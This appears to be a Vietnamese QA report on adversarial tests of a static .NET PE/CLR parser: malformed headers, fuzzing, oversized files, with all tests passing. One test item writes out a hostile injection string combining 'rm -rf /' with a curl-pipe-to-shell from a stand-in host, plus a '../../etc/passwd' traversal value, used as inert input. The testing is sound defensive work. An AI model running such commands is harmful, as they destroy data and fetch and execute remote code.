# G0-NET — tester adversarial cho `namios_dotnet` (parser PE/CLR tĩnh)

**Tester:** G0-NET (độc lập, không phải dev của `namios_dotnet`). **Phạm
vi:** parser PE/COFF + CLR header thuần struct (`src/namios_dotnet/`) —
tấn công `pe_format.py` qua cả gọi trực tiếp và end-to-end qua
`DotnetAnalyzer.analyze()`.

**Test file:** `tests/qa/G0-NET/test_g0net_adversarial.py` (36 test, viết
ĐỘC LẬP với `tests/unit/dotnet/*` của dev — không sao chép case, không sửa
file dev; tái dùng `fixtures/dotnet/pe_builder` chỉ như builder công khai,
không import file test của dev).

## Lệnh chạy

```
PYTHONDONTWRITEBYTECODE=1 \
PYTHONPATH=/home/node/.openclaw/workspace/code_projects/namios/src \
/home/node/.openclaw/workspace/code_projects/namios/.venv/bin/python -m pytest \
  /home/node/.openclaw/workspace/code_projects/namios/tests/qa/G0-NET \
  -p no:cacheprovider -q
```

## Kết quả (02/11/2026, Python 3.11, Debian 12)

```
36 passed in ~0.3s
```

Chạy lặp lại 3 lần liên tiếp → cùng kết quả, cùng số lượng test, không
flaky; test file lớn/sparse (256 MiB, 64 MiB) đều chạy xong < 1s thực tế
(ngưỡng assert đặt rộng ở 5s để tránh flaky trên máy chậm).

Suite toàn repo (trừ `tests/qa/G0-CLI` — thư mục untracked có lỗi import
tương đối tiền-tồn-tại, KHÔNG liên quan tới phạm vi G0-NET, không sửa vì
không thuộc module được giao) vẫn GREEN sau khi thêm bộ test này:

```
531 passed, 1 skipped in ~5.9s
```

## Các mũi tấn công đã thử (theo brief)

1. **`e_lfanew` trỏ ra ngoài file / cực lớn** — biên đúng `== len(data)`
   (đi qua check `>` nhưng hết dữ liệu ở tầng sau) và giá trị 32-bit lớn
   nhất `0xFFFFFFFF` (gần nhất với "âm" mà field unsigned 4-byte này biểu
   diễn được) — cả ở tầng `pe_format` lẫn end-to-end qua `DotnetAnalyzer`.
2. **PE header cụt ở nhiều điểm cắt khác dev** — parametrize 12 độ dài cắt
   (0, 1, 2, 3, ngay trước/giữa/sau offset `e_lfanew`, ngay trong/ngay sau
   DOS header 64 byte, giữa/cuối COFF header 20 byte) qua
   `DotnetAnalyzer.analyze()` end-to-end; cộng 2 case cắt đúng ngay biên
   chữ ký PE (`pe_header_offset+4 == len(data)`, chỉ 3/4 byte chữ ký) và
   ngay sau chữ ký PE (COFF header cụt 3 byte).
3. **Data directory count bịa lớn** — biên đúng `MAX_DATA_DIRECTORIES` (32
   được chấp nhận, 33 bị chặn) + giá trị "bịa" gần `0xFFFFFFFF`
   (`0xFFFFFFF0`, khác con số tròn `999999` dev đã dùng) + case tương tự
   cho `MAX_SECTIONS` (khai đúng 96 section hợp lệ ở tầng COFF nhưng buffer
   thực tế không đủ cho bảng section → phải lỗi có kiểm soát ở tầng
   `parse_section_table`, không đọc tràn/giả định 0).
4. **Optional header magic lạ** — 6 giá trị khác với case `0xDEAD` của dev:
   `0x0000`, `0xFFFF`, byte-swap `0x0B01`/`0x20B0`, và lệch 1 đơn vị so với
   2 magic hợp lệ thật (`0x010A`, `0x020C`) để chắc chắn không có so sánh
   "gần đúng"/range ngầm nào lọt qua.
5. **File 0 byte** — cả tầng `pe_format.parse_dos_header(b"")` trực tiếp và
   end-to-end qua `DotnetAnalyzer` (file thật 0 byte trên đĩa).
6. **File rất lớn (giới hạn kích thước, không OOM)** — file sparse 256 MiB
   (chỉ ghi 2 byte 'MZ' + 1 byte cuối để set kích thước, không ghi đặc toàn
   bộ) và 64 MiB có PE managed hợp lệ ở phần đầu; cả 2 đều phải hoàn thành
   < 5s thực tế (đo bằng `time.monotonic`, không chỉ tin cờ `truncated`) và
   `warnings_vi` phải báo đã cắt. Xác nhận: không đọc/scan toàn bộ file dù
   dữ liệu "nhìn hợp lệ" ở đầu.
7. **Bytes ngẫu nhiên** — 3 bộ fuzz XÁC ĐỊNH (seed cố định, tái lập được,
   không cần `hypothesis` — không có trong môi trường):
   - 60 mẫu hoàn toàn ngẫu nhiên, KHÔNG có tiền tố 'MZ' (độ dài 0–4096).
   - 80 mẫu CÓ tiền tố 'MZ' + phần sau ngẫu nhiên (độ dài 2–2048) — ép
     parser đi sâu vào COFF/Optional/section/CLR trên dữ liệu rác.
   - 40 mẫu lật byte ngẫu nhiên (1–20 vị trí) trên một PE managed HỢP LỆ
     có sẵn (mô phỏng hỏng cục bộ do lỗi copy, không phải rác hoàn toàn).
   Tổng 180 mẫu fuzz, mọi lần `DotnetAnalyzer.analyze()` phải trả kết quả
   (không ngoại lệ uncaught) — không mẫu nào fail.
8. **Không thực thi gì** — `monkeypatch` chặn `os.system`/
   `subprocess.run`/`Popen`/`call` thành assertion-fail nếu bị gọi, rồi
   chạy 2 payload cố ý "trông giống" command injection: (a) chuỗi
   `"; rm -rf / #$(curl evil.sh|sh)"` nhúng trong vùng raw data của PE; (b)
   sidecar `.runtimeconfig.json` có TFM/framework-name chứa cùng chuỗi đó
   và path traversal `"../../etc/passwd"`. Cả 2 case: không có lời gọi
   exec nào xảy ra, dữ liệu được coi là văn bản thuần (TFM lưu nguyên
   chuỗi độc hại dưới dạng string, không bị "làm sạch" ngầm thành giá trị
   khác và không ảnh hưởng luồng chạy).

## Kết luận

**Không phát hiện defect.** `pe_format.py`/`analyzer.py`/`_io.py` chống đỡ
đúng tất cả 8 mũi tấn công trong brief: mọi input dị dạng/cụt/bịa/ngẫu
nhiên/khổng lồ đều trả `DotnetAnalysisResult` có kiểm soát (`NOT_PE`/
`MALFORMED`, `confidence=0.0`), không ngoại lệ không kiểm soát, không đọc
vượt `DEFAULT_MAX_PE_BYTES`/`MAX_SECTIONS`/`MAX_DATA_DIRECTORIES`, không
treo, và không có nhánh nào thực thi nội dung file đầu vào. Không có mục
`defects.md` kèm theo (không có defect thật để ghi).

Không có dòng `blocked_external_dependency` — toàn bộ phạm vi G0-NET chạy
được bằng logic thuần + filesystem thật ngay tại host này (Debian 12),
không cần Wine/.NET runtime/KVM (đúng tinh thần NET-001: parser KHÔNG BAO
GIỜ thực thi file .NET/PE, nên không cần môi trường chạy .NET để test nó).
